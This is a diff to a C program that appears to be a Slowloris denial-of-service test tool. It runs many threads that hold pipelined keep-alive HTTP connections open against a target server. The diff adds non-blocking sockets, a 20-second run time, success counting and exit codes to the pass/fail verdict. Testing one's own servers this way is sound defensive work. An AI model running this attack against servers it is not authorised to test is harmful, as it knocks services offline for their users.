@@ -58,6 +58,9 @@ of target device.
 IO Helper functions
 ***************************************************************************** */
 
+/** Sets a socket to non-blocking mode */
+static int set_non_block(int fd);
+
 /** Opens a TCP/IP connection using a blocking IO socket */
 static int connect2tcp(const char *a, const char *p);
 
@@ -94,7 +97,7 @@ Aomic operation helpers
 Global State and Settings
 ***************************************************************************** */
 
-#define TEST_TIME 0 /* test time in seconds 0 == inifinity */
+#define TEST_TIME 20 /* test time in seconds 0 == inifinity */
 #define USE_PIPELINING 1
 #define PRINT_PAGE_OF_DATA 1
 #define MTU_LIMIT (524)
@@ -108,6 +111,7 @@ static size_t total_requests;
 static size_t total_reads;
 static size_t total_disconnections;
 static size_t total_failures;
+static size_t total_success;
 
 static const char HTTP_REQUEST_HEAD[] =
     "GET / HTTP/1.1\r\nConnection: keep-alive\r\nHost: ";
@@ -191,16 +195,14 @@ static void *test_server_task(void *ignr_) {
     switch (test_server(15)) {
     case SERVER_OK:
       if (flag)
-        fprintf(stderr, "* So far, server is alive...\n");
+        fprintf(stderr, "* Server online.\n");
+      atomic_add(&total_success, 1);
       break;
-    case CONNECTION_FAILED:
-      atomic_add(&total_failures, 1);
-      break;
-    case REQUEST_FAILED:
-      atomic_add(&total_failures, 1);
-      break;
+    case CONNECTION_FAILED: /* overflow*/
+    case REQUEST_FAILED:    /* overflow*/
     case RESPONSE_TIMEOUT:
       atomic_add(&total_failures, 1);
+      fprintf(stderr, "* Failure detected.\n");
       break;
     }
   }
@@ -213,6 +215,7 @@ Main attack function
 ***************************************************************************** */
 
 int main(int argc, char const *argv[]) {
+  int result = 0;
   ASSERT_COND(argc == 3 || argc == 4,
               "\nTo test HTTP/1.1 server against Slowloris, "
               "use: %s addr port [attackers]\ni.e.:\n\t\t%s example.com 80"
@@ -245,7 +248,7 @@ int main(int argc, char const *argv[]) {
     break;
   }
 
-  fprintf(stderr, "* Starting %zu attack loops, with each request %zu bytes.\n",
+  fprintf(stderr, "* Starting %zu attack loops, with %zu bytes per request.\n",
           ATTACKERS, MSG_LEN / REQ_PER_MSG);
   size_t thread_count = 0;
   pthread_t *threads = calloc(sizeof(*threads), ATTACKERS + 1);
@@ -276,15 +279,20 @@ int main(int argc, char const *argv[]) {
 
   if (total_failures || test_server(5) != SERVER_OK) {
     /* finished sending all requests, no errors detected. */
+    result = 2;
     fprintf(stderr,
             "\n* FAILED: server DoS achieved sending %zu bytes, reading %zu "
             "bytes and using %zu attackers... experienced %zu access "
             "failures the target is likely "
-            "suseptible to an attack.\n",
+            "susceptible to an attack.\n",
             (total_requests * MSG_LEN * REQ_PER_MSG), total_reads, ATTACKERS,
             total_failures);
-  } else if ((end > start && (total_disconnections / 2) / (end - start) == 0) ||
+  } else if ((end > start &&
+              (end - start < 10 ||
+               (total_success >> 1) != ((size_t)(end - start) >> 1)) &&
+              (total_disconnections / 2) / (end - start) == 0) ||
              (end == start && total_disconnections)) {
+    result = 1;
     /* connections remained open. */
     fprintf(
         stderr,
@@ -300,18 +308,36 @@ int main(int argc, char const *argv[]) {
     /* couldn't send all requests, connection interrupted. */
     fprintf(stderr,
             "\n* PASS: sent %zu bytes, read %zu "
-            "bytes and used %zu attackers... but experienced %zu "
-            "disconnections.\n",
+            "bytes and used %zu attackers... experienced %zu "
+            "disconnections or %zu/%zu responses.\n",
             (total_requests * MSG_LEN * REQ_PER_MSG), total_reads, ATTACKERS,
-            total_disconnections);
+            total_disconnections, total_success, (size_t)(end - start));
   }
   fprintf(stderr, "Attack ran for %zu seconds.\n", (size_t)(end - start));
-  return 0;
+  return result;
 }
 
 /* *****************************************************************************
 IO Helper functions - implementation
 ***************************************************************************** */
+
+static int set_non_block(int fd) {
+/* If they have O_NONBLOCK, use the Posix way to do it */
+#if defined(O_NONBLOCK)
+  /* Fixme: O_NONBLOCK is defined but broken on SunOS 4.1.x and AIX 3.2.5. */
+  int flags;
+  if (-1 == (flags = fcntl(fd, F_GETFL, 0)))
+    flags = 0;
+  // printf("flags initial value was %d\n", flags);
+  return fcntl(fd, F_SETFL, flags | O_NONBLOCK | O_CLOEXEC);
+#elif defined(FIONBIO)
+  /* Otherwise, use the old way of doing it */
+  static int flags = 1;
+  return ioctl(fd, FIONBIO, &flags);
+#else
+#error No functions / argumnet macros for non-blocking sockets.
+#endif
+}
 
 /** Opens a TCP/IP connection using a blocking IO socket */
 static int __attribute__((unused)) connect2tcp(const char *a, const char *p) {
@@ -329,7 +355,7 @@ static int __attribute__((unused)) connect2tcp(const char *a, const char *p) {
   // get the file descriptor
   int fd =
       socket(addrinfo->ai_family, addrinfo->ai_socktype, addrinfo->ai_protocol);
-  if (fd <= 0) {
+  if (fd == -1 || set_non_block(fd) < 0) {
     freeaddrinfo(addrinfo);
     return -1;
   }
@@ -354,26 +380,23 @@ socket_okay:
 static inline int wait__internal(int fd, uint16_t events) {
   errno = 0;
   int i = 0;
-  do {
-    struct pollfd ls[1] = {{.fd = fd, .events = events}};
-    i = poll(ls, 1, 1000);
-    if (i > 0) {
-      if ((ls[0].revents & POLLHUP) || (ls[0].revents & POLLERR) ||
-          (ls[0].revents & POLLNVAL)) {
-        // close(ls[0].fd);
-        errno = EBADF;
-        return -1;
-      }
-      return 0;
-    }
-    switch (errno) {
-    case EFAULT: /* overflow */
-    case EINVAL: /* overflow */
-    case ENOMEM: /* overflow */
-    case EAGAIN: /* overflow */
+  struct pollfd ls[1] = {{.fd = fd, .events = events}};
+  i = poll(ls, 1, 1000);
+  if (i > 0) {
+    if ((ls[0].revents & POLLHUP) || (ls[0].revents & POLLERR) ||
+        (ls[0].revents & POLLNVAL)) {
+      // close(ls[0].fd);
+      errno = EBADF;
       return -1;
     }
-  } while (errno == EINTR);
+    return 0;
+  }
+  switch (errno) {
+  case EFAULT: /* overflow */
+  case EINVAL: /* overflow */
+  case ENOMEM: /* overflow */
+    return -1;
+  }
   errno = EWOULDBLOCK;
   return -1;
 }
@@ -461,17 +484,18 @@ static void attack_server(void) {
         }
       }
 
-    } else if (errno != EWOULDBLOCK) {
+    } else if (errno != EWOULDBLOCK && errno != EAGAIN) {
       break;
     }
     if (wait4read(fd) == 0) {
       size_t buf;
       if (read(fd, &buf, sizeof(buf)) != sizeof(buf))
-        break; /* read a single byte at a time */
+        break; /* read a few bytes at a time */
       atomic_add(&total_reads, sizeof(buf));
     }
   }
   if (flag)
     atomic_add(&total_disconnections, 1);
   close(fd);
+  return;
 }
